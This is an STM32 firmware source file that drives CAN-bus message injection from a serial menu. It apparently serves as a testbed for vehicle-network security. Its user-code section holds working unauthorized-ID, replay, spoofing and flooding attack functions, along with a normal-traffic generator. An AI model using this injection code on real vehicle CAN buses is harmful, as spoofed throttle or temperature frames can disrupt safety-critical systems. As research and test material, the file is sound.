/* USER CODE BEGIN Header */
/* USER CODE END Header */
/* Includes ------------------------------------------------------------------*/
#include "main.h"
#include "Serial.h"

/* Private includes ----------------------------------------------------------*/
/* USER CODE BEGIN Includes */
/* USER CODE END Includes */

/* Private typedef -----------------------------------------------------------*/
/* USER CODE BEGIN PTD */
/* USER CODE END PTD */

/* Private define ------------------------------------------------------------*/
/* USER CODE BEGIN PD */
/* USER CODE END PD */

/* Private macro -------------------------------------------------------------*/
/* USER CODE BEGIN PM */
/* USER CODE END PM */

/* Private variables ---------------------------------------------------------*/
CAN_HandleTypeDef hcan1;

UART_HandleTypeDef huart4;

/* USER CODE BEGIN PV */
/* USER CODE END PV */

/* Private function prototypes -----------------------------------------------*/
void SystemClock_Config(void);
static void MX_GPIO_Init(void);
static void MX_CAN1_Init(void);
static void MX_UART4_Init(void);
/* USER CODE BEGIN PFP */
/* USER CODE END PFP */

/* Private user code ---------------------------------------------------------*/
/* USER CODE BEGIN 0 */
CAN_TxHeaderTypeDef TxHeader;
CAN_RxHeaderTypeDef RxHeader;
uint8_t TxData[8];
uint8_t RxData[8];
uint32_t TxMailbox;
/* USER CODE END 0 */

/**
 * @brief  The application entry point.
 * @retval int
 */
int main(void) {

	/* USER CODE BEGIN 1 */
	/* USER CODE END 1 */

	/* MCU Configuration--------------------------------------------------------*/

	/* Reset of all peripherals, Initializes the Flash interface and the Systick. */
	HAL_Init();

	/* USER CODE BEGIN Init */
	/* USER CODE END Init */

	/* Configure the system clock */
	SystemClock_Config();

	/* USER CODE BEGIN SysInit */
	/* USER CODE END SysInit */

	/* Initialize all configured peripherals */
	MX_GPIO_Init();
	MX_CAN1_Init();
	MX_UART4_Init();
	/* USER CODE BEGIN 2 */

	HAL_CAN_Start(&hcan1);
	HAL_CAN_ActivateNotification(&hcan1, CAN_IT_RX_FIFO0_MSG_PENDING);

	/* USER CODE END 2 */

	/* Infinite loop */
	/* USER CODE BEGIN WHILE */
	/* USER CODE END WHILE */

	/* USER CODE BEGIN 3 */
	while (1) {
		MainMenu();
	}
	/* USER CODE END 3 */
}

/**
 * @brief System Clock Configuration
 * @retval None
 */
void SystemClock_Config(void) {
	RCC_OscInitTypeDef RCC_OscInitStruct = { 0 };
	RCC_ClkInitTypeDef RCC_ClkInitStruct = { 0 };

	/** Configure the main internal regulator output voltage
	 */
	__HAL_RCC_PWR_CLK_ENABLE();
	__HAL_PWR_VOLTAGESCALING_CONFIG(PWR_REGULATOR_VOLTAGE_SCALE1);

	/** Initializes the RCC Oscillators according to the specified parameters
	 * in the RCC_OscInitTypeDef structure.
	 */
	RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_HSI;
	RCC_OscInitStruct.HSIState = RCC_HSI_ON;
	RCC_OscInitStruct.HSICalibrationValue = RCC_HSICALIBRATION_DEFAULT;
	RCC_OscInitStruct.PLL.PLLState = RCC_PLL_ON;
	RCC_OscInitStruct.PLL.PLLSource = RCC_PLLSOURCE_HSI;
	RCC_OscInitStruct.PLL.PLLM = 8;
	RCC_OscInitStruct.PLL.PLLN = 84;
	RCC_OscInitStruct.PLL.PLLP = RCC_PLLP_DIV2;
	RCC_OscInitStruct.PLL.PLLQ = 4;
	if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK) {
		Error_Handler();
	}

	/** Initializes the CPU, AHB and APB buses clocks
	 */
	RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK | RCC_CLOCKTYPE_SYSCLK
			| RCC_CLOCKTYPE_PCLK1 | RCC_CLOCKTYPE_PCLK2;
	RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_PLLCLK;
	RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV2;
	RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV1;
	RCC_ClkInitStruct.APB2CLKDivider = RCC_HCLK_DIV1;

	if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_1) != HAL_OK) {
		Error_Handler();
	}
}

/**
 * @brief CAN1 Initialization Function
 * @param None
 * @retval None
 */
static void MX_CAN1_Init(void) {

	/* USER CODE BEGIN CAN1_Init 0 */
	/* USER CODE END CAN1_Init 0 */

	/* USER CODE BEGIN CAN1_Init 1 */
	/* USER CODE END CAN1_Init 1 */
	hcan1.Instance = CAN1;
	hcan1.Init.Prescaler = 6;
	hcan1.Init.Mode = CAN_MODE_NORMAL;
	hcan1.Init.SyncJumpWidth = CAN_SJW_1TQ;
	hcan1.Init.TimeSeg1 = CAN_BS1_11TQ;
	hcan1.Init.TimeSeg2 = CAN_BS2_2TQ;
	hcan1.Init.TimeTriggeredMode = DISABLE;
	hcan1.Init.AutoBusOff = DISABLE;
	hcan1.Init.AutoWakeUp = DISABLE;
	hcan1.Init.AutoRetransmission = DISABLE;
	hcan1.Init.ReceiveFifoLocked = DISABLE;
	hcan1.Init.TransmitFifoPriority = DISABLE;
	if (HAL_CAN_Init(&hcan1) != HAL_OK) {
		Error_Handler();
	}
	/* USER CODE BEGIN CAN1_Init 2 */
	/* USER CODE END CAN1_Init 2 */

}

/**
 * @brief UART4 Initialization Function
 * @param None
 * @retval None
 */
static void MX_UART4_Init(void) {

	/* USER CODE BEGIN UART4_Init 0 */
	/* USER CODE END UART4_Init 0 */

	/* USER CODE BEGIN UART4_Init 1 */
	/* USER CODE END UART4_Init 1 */
	huart4.Instance = UART4;
	huart4.Init.BaudRate = 115200;
	huart4.Init.WordLength = UART_WORDLENGTH_8B;
	huart4.Init.StopBits = UART_STOPBITS_1;
	huart4.Init.Parity = UART_PARITY_NONE;
	huart4.Init.Mode = UART_MODE_TX_RX;
	huart4.Init.HwFlowCtl = UART_HWCONTROL_NONE;
	huart4.Init.OverSampling = UART_OVERSAMPLING_16;
	if (HAL_UART_Init(&huart4) != HAL_OK) {
		Error_Handler();
	}
	/* USER CODE BEGIN UART4_Init 2 */
	/* USER CODE END UART4_Init 2 */

}

/**
 * @brief GPIO Initialization Function
 * @param None
 * @retval None
 */
static void MX_GPIO_Init(void) {
	/* USER CODE BEGIN MX_GPIO_Init_1 */
	/* USER CODE END MX_GPIO_Init_1 */

	/* GPIO Ports Clock Enable */
	__HAL_RCC_GPIOH_CLK_ENABLE();
	__HAL_RCC_GPIOA_CLK_ENABLE();

	/* USER CODE BEGIN MX_GPIO_Init_2 */
	/* USER CODE END MX_GPIO_Init_2 */
}

/* USER CODE BEGIN 4 */

/* in the Below Block we are going to implemnt the Attack Can Function calls
 *
 */

void UnauthorizedAttack(void) {
	TxHeader.DLC = 8;
	TxHeader.StdId = 0x0E0;
	TxHeader.IDE = CAN_ID_STD;
	TxHeader.RTR = CAN_RTR_DATA;

	for (int i = 0; i < 8; i++) {
		TxData[i] = (rand() % 256);
	}
	while (!(ReadExitStatus())) {
		TxHeader.StdId++;
		if (HAL_CAN_AddTxMessage(&hcan1, &TxHeader, TxData, &TxMailbox)
				!= HAL_OK) {
			PrintLog("CAN 1 UnauthorizedAttack  Transmit Failed \n");
			return;
		}
		PrintLog("\r\nUNAUTHORIZED FRAME INJECTED \n");
		HAL_Delay(500);
	}
}

void ReplayAttack(void) {
	TxHeader.DLC = 8;
	TxHeader.StdId = TEMPERATURE_DEVICE_ID;
	TxHeader.IDE = CAN_ID_STD;
	TxHeader.RTR = CAN_RTR_DATA;

	memset(TxData, 0, sizeof(TxData));

	HAL_CAN_AbortTxRequest(&hcan1, TxMailbox);
	while (!(ReadExitStatus())) {

		while (HAL_CAN_GetTxMailboxesFreeLevel(&hcan1) == 0) {
			PrintLog("\r\n Mail Box is Filled  \n");
			HAL_Delay(200);
		}
		TxData[0] = rand() % MAX_TEMPERATURE;
		if (HAL_CAN_AddTxMessage(&hcan1, &TxHeader, TxData, &TxMailbox)
				!= HAL_OK) {
			PrintLog("\r\n CAN 1 ReplayAttack Transmit Failed \n");
			return;
		}
		PrintLog("\r\n REPLAY FRAME INJECTED \n");
		HAL_Delay(500);
	}
}
void SpoofingAttack(void) {
	HAL_CAN_AbortTxRequest(&hcan1, TxMailbox);

	while (!(ReadExitStatus())) {

		TxHeader.DLC = 8;
		TxHeader.StdId = TEMPERATURE_DEVICE_ID;
		TxHeader.IDE = CAN_ID_STD;
		TxHeader.RTR = CAN_RTR_DATA;

		memset(TxData, 0, sizeof(TxData));
		TxData[0] = MAX_TEMPERATURE + 4;
		if (HAL_CAN_AddTxMessage(&hcan1, &TxHeader, TxData, &TxMailbox)
				!= HAL_OK) {
			PrintLog("\r\n CAN 1 SpoofingAttack Transmit Failed \n");
			return;
		}

		PrintLog("\r\n SPOOFING FRAME INJECTED \n");
		HAL_Delay(500);

		memset(TxData, 0, sizeof(TxData));
		TxHeader.StdId = THROTTLE_POSITION_ID;
		TxData[0] = MAX_THROTTLE + 4;
		if (HAL_CAN_AddTxMessage(&hcan1, &TxHeader, TxData, &TxMailbox)
				!= HAL_OK) {
			PrintLog("\r\n CAN 1 SpoofingAttack Transmit Failed \n");
			return;
		}
		PrintLog("\r\n SPOOFING FRAME INJECTED \n");
	}
}
void FloodingAttack(void) {
	TxHeader.DLC = 8;
	TxHeader.StdId = TEMPERATURE_DEVICE_ID;
	TxHeader.IDE = CAN_ID_STD;
	TxHeader.RTR = CAN_RTR_DATA;

	memset(TxData, 0, sizeof(TxData));
	HAL_CAN_AbortTxRequest(&hcan1, TxMailbox);

	while (!(ReadExitStatus())) {

		TxData[0] = ( MAX_TEMPERATURE - 4);
		TxData[1] = 0;
		if (HAL_CAN_AddTxMessage(&hcan1, &TxHeader, TxData, &TxMailbox)
				!= HAL_OK) {
			PrintLog("\r\n CAN 1 FloodingAttack Transmit Failed \n");
			return;
		}
		PrintLog("\r\n FLOODING FRAME INJECTED \n");
		HAL_Delay(500);
	}
}
void NormalMessage(void) {

	uint32_t tempEngineRpm;
	HAL_CAN_AbortTxRequest(&hcan1, TxMailbox);
	while (!(ReadExitStatus())) {

		PrintLog("\r\n CAN NORMAL MESSAGE WAS INJECTED ON BUS \n");

		TxHeader.DLC = 8;
		TxHeader.StdId = TEMPERATURE_DEVICE_ID;
		TxHeader.IDE = CAN_ID_STD;
		TxHeader.RTR = CAN_RTR_DATA;

		memset(TxData, 0, sizeof(TxData));

//		TxData[0] = rand() % MAX_TEMPERATURE;
		TxData[0] = (rand() % (MAX_TEMPERATURE - MIN_TEMPERATURE + 1)) + MIN_TEMPERATURE;
		if (HAL_CAN_AddTxMessage(&hcan1, &TxHeader, TxData, &TxMailbox)
				!= HAL_OK) {
			PrintLog("\r\n CAN 1 NormalMessage Transmit Failed \n");
			return;
		}

		HAL_Delay(250);

		TxHeader.StdId = THROTTLE_POSITION_ID;
		memset(TxData, 0, sizeof(TxData));
//		TxData[0] = rand() % MAX_THROTTLE;
		TxData[0] = (rand() % (MAX_THROTTLE - MIN_THROTTLE + 1)) + MIN_THROTTLE;
		if (HAL_CAN_AddTxMessage(&hcan1, &TxHeader, TxData, &TxMailbox)
				!= HAL_OK) {
			PrintLog("\r\n CAN 1 Transmit Failed \n");
			return;
		}

		HAL_Delay(250);

		TxHeader.StdId = ENGINE_RPM_DEVICE_ID;
		memset(TxData, 0, sizeof(TxData));
//		tempEngineRpm = rand() % MAX_ENGINE_RPM;
		tempEngineRpm = (rand() % (MAX_ENGINE_RPM - MIN_ENGINE_RPM + 1)) + MIN_ENGINE_RPM;
		TxData[0] = (tempEngineRpm & 0xFF);
		TxData[1] = ((tempEngineRpm >> 8) & 0xFF);
		if (HAL_CAN_AddTxMessage(&hcan1, &TxHeader, TxData, &TxMailbox)
				!= HAL_OK) {
			PrintLog("\r\n CAN 1 Transmit Failed \n");
			return;
		}

	}
}

/* USER CODE END 4 */

/**
 * @brief  This function is executed in case of error occurrence.
 * @retval None
 */
void Error_Handler(void) {
	/* USER CODE BEGIN Error_Handler_Debug */
	/* USER CODE END Error_Handler_Debug */
}
#ifdef USE_FULL_ASSERT
/**
  * @brief  Reports the name of the source file and the source line number
  *         where the assert_param error has occurred.
  * @param  file: pointer to the source file name
  * @param  line: assert_param error line source number
  * @retval None
  */
void assert_failed(uint8_t *file, uint32_t line)
{
  /* USER CODE BEGIN 6 */
  /* USER CODE END 6 */
}
#endif /* USE_FULL_ASSERT */
